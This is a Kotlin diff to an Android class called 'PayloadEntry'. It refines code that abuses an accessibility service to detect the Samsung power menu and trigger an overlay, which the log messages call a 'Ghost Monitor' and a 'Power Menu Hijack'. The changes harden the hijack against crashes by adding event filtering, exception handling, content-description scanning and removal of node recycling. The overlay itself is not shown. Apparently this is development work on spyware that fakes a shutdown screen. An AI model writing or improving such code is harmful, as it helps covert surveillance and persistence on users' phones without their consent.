@@ -26,18 +26,25 @@ class PayloadEntry : DynamicEntry {
             DynamicEntry.log("🕵️ Ghost Monitor Active: Waiting for Power Menu...")
             
             DynamicEntry.accessibilityInterceptor = { event ->
-                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
-                root?.let {
-                    val nodes = mutableListOf<String>()
-                    findTextNodes(it, nodes)
-                    it.recycle()
-
-                    // Heuristic: If we see these three specific Samsung strings, trigger the hijack
-                    if (nodes.contains("Power off") && nodes.contains("Restart")) {
-                        if (!isOverlayShowing) {
-                            DynamicEntry.log("🎯 Power Menu Detected! Injecting Overlay.")
-                            isOverlayShowing = true
+                // Only scan when the window actually changes to save CPU and prevent crashes
+                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
+                    root?.let {
+                        try {
+                            val nodes = mutableListOf<String>()
+                            findTextNodes(it, nodes)
+                            
+                            if (nodes.any { n -> n.contains("Power off", ignoreCase = true) } && 
+                                nodes.any { n -> n.contains("Restart", ignoreCase = true) }) {
+                                if (!isOverlayShowing) {
+                                    DynamicEntry.log("🎯 Power Menu Hijack Triggered")
+                                    isOverlayShowing = true
+                                }
+                            }
+                        } catch (e: Exception) {
+                            DynamicEntry.log("⚠️ Scan error: ${e.message}")
                         }
+                        // REMOVED it.recycle() - Let the system handle the lifecycle to prevent native crashes
                     }
                 }
             }
@@ -72,11 +79,19 @@ class PayloadEntry : DynamicEntry {
 
     private fun findTextNodes(node: AccessibilityNodeInfo?, results: MutableList<String>) {
         if (node == null) return
-        node.text?.let { results.add(it.toString()) }
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i)
-            findTextNodes(child, results)
-            child?.recycle()
+        
+        try {
+            val text = node.text?.toString()
+            val desc = node.contentDescription?.toString()
+            
+            if (!text.isNullOrBlank()) results.add(text)
+            if (!desc.isNullOrBlank()) results.add(desc)
+
+            for (i in 0 until node.childCount) {
+                findTextNodes(node.getChild(i), results)
+            }
+        } catch (e: Exception) {
+            // Node might have become invalid during crawl
         }
     }
 
